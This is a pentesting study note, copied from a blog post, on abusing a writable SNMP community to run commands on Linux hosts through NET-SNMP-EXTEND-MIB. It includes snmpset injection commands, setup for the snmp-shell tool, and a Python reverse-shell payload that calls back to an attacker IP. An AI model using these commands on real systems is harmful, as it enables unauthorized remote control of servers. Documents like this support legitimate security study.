---
creation date: July 6th 2023
last modified date: July 6th 2023
aliases: []
tags: #📖
---

Primary Categories: [[03 - SNMP Enumeration]] 
Secondary Categories: [[]] 
Links: [[]] 
Search Tag: #📖  

# [[03 - SNMP - RCE]]  

This post was copied from [https://rioasmara.com/2021/02/05/snmp-arbitary-command-execution-and-shell/](https://rioasmara.com/2021/02/05/snmp-arbitary-command-execution-and-shell/)

SNMP is sometimes overseen by the administrator of the device or server where it is left in a default configuration. SNMP community with write permissions (**rwcommunity**) on the Linux operating system can be abused to let the attacker execute a command on the server.

[![](https://camo.githubusercontent.com/5658408a6daf4804ec9268b185901b401ea0cc987e54312c0c91c8f2344f4386/68747470733a2f2f72696f61736d6172612e66696c65732e776f726470726573732e636f6d2f323032312f30322f696d6167652d362e706e673f773d353038)](https://camo.githubusercontent.com/5658408a6daf4804ec9268b185901b401ea0cc987e54312c0c91c8f2344f4386/68747470733a2f2f72696f61736d6172612e66696c65732e776f726470726573732e636f6d2f323032312f30322f696d6167652d362e706e673f773d353038)

# [Extending the Services](https://github.com/carlospolop/hacktricks/blob/master/network-services-pentesting/pentesting-snmp/snmp-rce.md#extending-the-services)

While you are not able to modify existing entries that were configured in **snmpd.conf**, it is possible to add additional commands over SNMP, because the “MAX-ACCESS” permission setting in the MIB definition is set to “**read-create**”

Adding a new command basically works by appending an additional row to the “**nsExtendObjects**” table.

```shell
snmpset -m +NET-SNMP-EXTEND-MIB -v 2c -c c0nfig localhost \
'nsExtendStatus."evilcommand"' = createAndGo \
'nsExtendCommand."evilcommand"' = /bin/echo \
'nsExtendArgs."evilcommand"' = 'hello world'
```

Injecting a command to run on the SNMP service. **NET-SNMP-EXTEND-MIB** requires that you always provide the absolute path to the executable. The called binary/script must also exist and be executable.

[![](https://camo.githubusercontent.com/733de69b399fbe423b77b2af10d4d617922099b8bf3bbea97aaf08962f168f96/68747470733a2f2f72696f61736d6172612e66696c65732e776f726470726573732e636f6d2f323032312f30322f696d6167652d31352e706e673f773d393136)](https://camo.githubusercontent.com/733de69b399fbe423b77b2af10d4d617922099b8bf3bbea97aaf08962f168f96/68747470733a2f2f72696f61736d6172612e66696c65732e776f726470726573732e636f6d2f323032312f30322f696d6167652d31352e706e673f773d393136)

Executing the command that we injected to the SNMP by enumerating it using snmpwalk

```shell
snmpwalk -v2c -c SuP3RPrivCom90 10.129.2.26 NET-SNMP-EXTEND-MIB::nsExtendObjects
```

Showing that the command is /bin/echo.

[![](https://camo.githubusercontent.com/e73f1d1fec20da6a914de9ec55bab6b2e648093175eddd36a76cedf93dbbc4b8/68747470733a2f2f72696f61736d6172612e66696c65732e776f726470726573732e636f6d2f323032312f30322f696d6167652d31312e706e673f773d353639)](https://camo.githubusercontent.com/e73f1d1fec20da6a914de9ec55bab6b2e648093175eddd36a76cedf93dbbc4b8/68747470733a2f2f72696f61736d6172612e66696c65732e776f726470726573732e636f6d2f323032312f30322f696d6167652d31312e706e673f773d353639)

The command will be executed when the it is read. **run-on-read()**

[![](https://camo.githubusercontent.com/3d6c724ff51be6bae68b7b06f2d5cda21d2b770831c2f3a14227792cfac02e6e/68747470733a2f2f72696f61736d6172612e66696c65732e776f726470726573732e636f6d2f323032312f30322f696d6167652d31322e706e673f773d363132)](https://camo.githubusercontent.com/3d6c724ff51be6bae68b7b06f2d5cda21d2b770831c2f3a14227792cfac02e6e/68747470733a2f2f72696f61736d6172612e66696c65732e776f726470726573732e636f6d2f323032312f30322f696d6167652d31322e706e673f773d363132)

The command **/bin/echo "hello rio is here"** was executed during our snmpwalk read

[![](https://camo.githubusercontent.com/83949e36c2caa180fb7856232c656bf87c5b0c92e649c9dca502eccdf203d434/68747470733a2f2f72696f61736d6172612e66696c65732e776f726470726573732e636f6d2f323032312f30322f696d6167652d31332e706e673f773d363533)](https://camo.githubusercontent.com/83949e36c2caa180fb7856232c656bf87c5b0c92e649c9dca502eccdf203d434/68747470733a2f2f72696f61736d6172612e66696c65732e776f726470726573732e636f6d2f323032312f30322f696d6167652d31332e706e673f773d363533)

# [Getting the Shell from Net-SNMP Extend](https://github.com/carlospolop/hacktricks/blob/master/network-services-pentesting/pentesting-snmp/snmp-rce.md#getting-the-shell-from-net-snmp-extend)

In this section, I would like to discuss how to gain a server shell to control the server.

You can use python script developed by **mxrch** that can be downloaded from [**https://github.com/mxrch/snmp-shell.git**](https://github.com/mxrch/snmp-shell.git)

You can install the pre-requisite to run this:

```shell
sudo apt install snmp snmp-mibs-downloader rlwrap -y
git clone https://github.com/mxrch/snmp-shell
cd snmp-shell
sudo python3 -m pip install -r requirements.txt
```

[![](https://camo.githubusercontent.com/cd192eea25a72836cdab388a340d56a397a4ceb9a6b8f88005442da774702d23/68747470733a2f2f72696f61736d6172612e66696c65732e776f726470726573732e636f6d2f323032312f30322f696d6167652d31382e706e673f773d373233)](https://camo.githubusercontent.com/cd192eea25a72836cdab388a340d56a397a4ceb9a6b8f88005442da774702d23/68747470733a2f2f72696f61736d6172612e66696c65732e776f726470726573732e636f6d2f323032312f30322f696d6167652d31382e706e673f773d373233)

**Creating reverse shell**

You can also create reverse shell manually by injecting the command below into the SNMP

```shell
snmpset -m +NET-SNMP-EXTEND-MIB -v 2c -c SuP3RPrivCom90 10.129.2.26 'nsExtendStatus."command10"' = createAndGo 'nsExtendCommand."command10"' = /usr/bin/python3.6 'nsExtendArgs."command10"' = '-c "import sys,socket,os,pty;s=socket.socket();s.connect((\"10.10.14.84\",8999));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn(\"/bin/sh\")"'
```

[![](https://camo.githubusercontent.com/528301594277072dd41c5a221e5fbb708159280458ed898d22d051cab16e73d9/68747470733a2f2f72696f61736d6172612e66696c65732e776f726470726573732e636f6d2f323032312f30322f696d6167652d31392e706e673f773d393330)](https://camo.githubusercontent.com/528301594277072dd41c5a221e5fbb708159280458ed898d22d051cab16e73d9/68747470733a2f2f72696f61736d6172612e66696c65732e776f726470726573732e636f6d2f323032312f30322f696d6167652d31392e706e673f773d393330)

run the snmpwalk to trigger the command execution

[![](https://camo.githubusercontent.com/205a3afa5ad6f1a50a03fe35f0f301889a837cb3cc80787f5997928003350ff3/68747470733a2f2f72696f61736d6172612e66696c65732e776f726470726573732e636f6d2f323032312f30322f696d6167652d32312e706e673f773d363837)](https://camo.githubusercontent.com/205a3afa5ad6f1a50a03fe35f0f301889a837cb3cc80787f5997928003350ff3/68747470733a2f2f72696f61736d6172612e66696c65732e776f726470726573732e636f6d2f323032312f30322f696d6167652d32312e706e673f773d363837)

Our netcat receives the reverseshell connection from the victim that allow us to gain control over the victim machine

[![](https://camo.githubusercontent.com/3572364a98e0c4da44fa885ef9e4c580e618668668e4ed4a48370a4a266b8ace/68747470733a2f2f72696f61736d6172612e66696c65732e776f726470726573732e636f6d2f323032312f30322f696d6167652d32302e706e673f773d353032)](https://camo.githubusercontent.com/3572364a98e0c4da44fa885ef9e4c580e618668668e4ed4a48370a4a266b8ace/68747470733a2f2f72696f61736d6172612e66696c65732e776f726470726573732e636f6d2f323032312f30322f696d6167652d32302e706e673f773d353032)

___

## Resources:

| Hyperlink | Info |
| --------- | ---- |


Created Date: July 6th 2023 (02:05 pm) 
Last Modified Date: July 6th 2023 (02:05 pm)
